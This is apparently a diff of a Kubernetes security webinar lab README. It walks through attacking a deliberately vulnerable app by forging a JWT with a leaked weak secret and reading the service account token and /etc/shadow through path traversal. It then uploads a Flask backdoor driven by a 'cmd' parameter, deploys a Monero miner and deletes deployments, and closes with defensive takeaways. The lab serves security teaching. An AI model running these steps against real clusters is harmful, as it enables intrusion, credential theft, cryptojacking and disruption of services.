@@ -12,51 +12,53 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
 - **Entrypoint**: web application
 
 
-## Steps to reproduce
 
-<!-- TODO: выбросить, смерджить с Attacks -->
-
-1. deploy [vulnerable-app](vulnerable-app) (both `auth-api` and `images-api`) and `another-app` (empty)
-2. explore the [images service]()
-
-2. Go to [auth service](http://auth.vulnapp.seck8s.slurm.io/)
+<!-- 2. Go to [auth service](http://auth.vulnerable-app.seck8s.slurm.io/)
 3. Sign-up any user and login
-4. Get redirection to the [image service](https://images.vulnapp.seck8s.slurm.io/) with the greatest cat in the world :)
+4. Get redirection to the [image service](https://images.vulnerable-app.seck8s.slurm.io/) with the greatest cat in the world :)
 5. Decode JWT token and try to get more privileges
 6. Write any interesting file (take a look at the image b64 data you'll receive)
 7. Upload any interesting file (note: the container runs as root so you're relatively free)
-8. Get working `kubectl` for the cluster
+8. Get working `kubectl` for the cluster -->
 
 
-## Attack
-2. register a test user in `auth-api`, get the JWT (with `user_role='user'`)
-3. proceed to `images-api` with the JWT token, see the image (partially logged in)
-<!-- > TODO: Show in dashboard : http://rus-vote.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api/logs -->
-<!-- JWT:
-1) architecture issue: symmetric algo (HS256 not RS256) => both services use the same secret and can issue a new jwt
-    look: our secret leaked from images service (LINK)
-2) weak secret: can crack (https://github.com/lmammino/jwt-cracker)
-3) privilege escalation
- -->
-1. get the `SECRET_KEY`:
-  - either find the [leaked value](http://rus-vote.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api) in the exposed unprotected Dashboard
-  - or check the Git commit history (`git blame`) to find the hard-coded secret in sources *vulnerability: [hard-coded credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*
-  <!-- TODO: link to github -->
-4. decode the JWT token using the leaked secret key and modify `user_role='admin'` (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
-<!-- TODO: link to
+## Steps to reproduce
 
-https://github.com/Slurmio/webinar-seck8s/blob/60a70a81d8c4d86e1df0994eb14b7aadf9732b86/03-appsec/vulnerable-app/images-api/app.py#L23-L31
--->
+1. deploy [./vulnerable-app](vulnerable-app) (both `auth-api` and `images-api`) and `another-app` (empty)
 
-<!-- NB: Source code is not secret -->
+2. explore the images service: [http://images.vulnerable-app.seck8s.slurm.io](http://images.vulnerable-app.seck8s.slurm.io), [http://images.vulnerable-app.seck8s.slurm.io?token=foo](http://images.vulnerable-app.seck8s.slurm.io?token=foo)
 
-5. proceed to `images-api` with the new token, see the admin page
-6. read some files: `../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token`, `../app.py`, `../../../../../../etc/shadow`, `../../../../../../etc/shadow/proc/1/environ`, etc.: (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)*)
+3. explore the auth service: [http://auth.vulnerable-app.seck8s.slurm.io/](http://auth.vulnerable-app.seck8s.slurm.io/), sign-up a user, login and be redirected to the images service
 
-> Note: inside the pod, kubectl is authenticated to the pod's SA. However, you could save SA's `token` and `ca.crt` to your local machine and, knowing the Kube API public URI, you can acess it remotely:
-> ```kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>```
+4. side note: it is insecure to pass sensitive information in GET parameters, see how it gets logged to stdout by Flask: [dashboard link](http://dashboard.seck8s.slurm.io/clusters/local/namespaces/vulnerable-app/deployments/images-api/logs)
 
-7. write the `./app.py` with backdoor activated via GET parameter `cmd` ([Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload))
+---
+
+5. copy the JWT token, explore it in [jwt.io](https://jwt.io/):
+    - architecture issue: symmetric algorithm (HS256 not RS256) => both services (the one that generates and another that checks the token) use the same secret and therefore *both can issue a new JWT*
+
+6. crack or leak the secret `secret123`:
+    - leaked through the K8s configuration (secret mount to the env var `SECRET_KEY` is hard-coded in the manifest): [dashboard link](http://dashboard.seck8s.slurm.io/clusters/local/namespaces/vulnerable-app/deployments/images-api)
+    <!-- TODO: save permalink below -->
+    - since the manifests are version-controlled, can be found in the Git commit history (`git blame`): [github link](https://github.com/Slurmio/webinar-seck8s/blob/main/03-application-security/vulnerable-app/images-api/deploy/images-api.yaml#L23) (*vulnerability: [Hard-Coded Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*. Remember: source code is not secret!)
+    - the secret is weak therefore very easy to crack - in minutes with the tool [lmammino/jwt-cracker](https://github.com/lmammino/jwt-cracker) (*vulnerability: Weak Secret*)
+
+7. escalate provileges by changing the `"role": "user"` to `"role": "admin"` in the JWT payload (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
+
+8. proceed to `images-api` with the new token, see the admin page
+
+---
+
+9. read some files from the pod: `../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token` (pod service account's token and certificate), `../app.py` (source code of the Flask app), `../../../../../../etc/shadow/proc/1/environ` (pod environment variables), etc. (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)* + too high privileges as the pod is running as `root` in the container)
+
+> Note: by now, we acquired the service account credentials to the cluster. If we know the external Kube API address (if it's exposed), then we have the remote kubectl access:
+> `kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>`
+
+> However, Kube API is not always exposed, so let's try to get kubectl working from the pod itself.
+---
+
+10. upload the new Flask file to `../app.py` with the backdoor activated via GET parameter `cmd` (*vulnerability: [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)* -- the attacker can upload file to an arbitrary directory):
+    - construct the payload ([payloads/app.py](payloads/app.py)):
     ```python
     ...
     @app.route("/", methods=["GET"])
@@ -68,25 +70,41 @@ https://github.com/Slurmio/webinar-seck8s/blob/60a70a81d8c4d86e1df0994eb14b7aadf
             return p.stdout.decode()
         ...
     ```
-    <!-- TODO: use pre-prepared payload app.py -->
-    <!-- TODO: use curl not burp -->
-8. since the server is in Debug mode, it auto-reloads without restarting the pod
-9. use the backdoor to install `kubectl`:
-    <!-- we're in Ubuntu, and root => apt-get  -->
-    <!-- TODO: kubectl get all -->
-    <!-- TODO: curl -->
-  - `?cmd=apt-get+update`
-  - `?cmd=apt-get+-y+install+curl`
-  - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/ :
-  - `?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22`
-  - `?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl`
-  - `?cmd=kubectl+get+all`
+    - try to browse [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get Unauthorized
+    ```sh
+    TOKEN=<your token>
+    curl -vv -o /tmp/out.html -F "file=@payloads/app.py; filename=../app.py" "http://images.vulnerable-app.seck8s.slurm.io/?token=$TOKEN"
+    ```
+    - try again [http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls](http://images.vulnerable-app.seck8s.slurm.io/?cmd=ls), get the backdoor shell
+    - since the server is in Debug mode, it auto-reloads without restarting the pod
 
-<!-- TODO : 'kubectl cluster-info dump' -->
+9. use the backdoor to install `kubectl` (note again: the pod is running Ubuntu as `root`) by navigating to `http://images.vulnerable-app.seck8s.slurm.io/?cmd=...`:
+    - `kubectl get all`
+    - install kubectl ([instruction](http://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)):
+        - `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"`
+        - `install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl`
+    - `kubectl get all`
 
-10. now you can use kubectl configured to the workload's service account (deploy a miner): `?cmd=kubectl+apply+-f+images/monero-deployment.yaml`
-11. or shut down the cluster's payload (Deployment only, permitted by RBAC): `?cmd=kubectl+delete+deployment+auth-api`
+10. note, the pod's SA has only permissions on Deployments -- it's done by mistake by another developer who accidentally gave extra permissions to the default service account in the namespace `vulnerable-app` (see [vulnerable-app/another-app/deploy/rbac.yaml](vulnerable-app/another-app/deploy/rbac.yaml))
 
+11. now, let's deploy a miner:
+    - use the web form [http://images.vulnerable-app.seck8s.slurm.io/?token=...](http://images.vulnerable-app.seck8s.slurm.io/?token=...) to upload the miner's manifest [payloads/monero-deployment.yaml](payloads/monero-deployment.yaml) (note: you need to use the admin JWT token again)
+    - use the backdoor to: `kubectl apply -f images/monero-deployment.yaml`
 
-# Takeaways
-<!-- TODO: -->
+11. or shut down the cluster's payload (Deployment only, permitted by RBAC): `kubectl delete deployment auth-api`
+
+12. cleanup:
+    ```sh
+    cd vulnerable-app
+    k delete -f another-app/deploy
+    k -n vulnerable-app delete -f images-api/deploy
+    k -n vulnerable-app delete -f auth-api/deploy
+    k delete ns vulnerable-app
+    cd ../../02-exposed-dashboard/
+    k -n exposed-dashboard delete -f kube-web-view/deploy
+    k -n exposed-dashboard delete -f kube-web-view/deploy-ingress
+    ```
+
+## Takeaways
+- Application vulnerabilities are common attack entrypoints, see [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- Try to minimize the attacker's capabilities (use minimal images as alpine, don't run containers as root, note the sensitive information to be hard-coded, minimize privileges of the service accounts, etc)
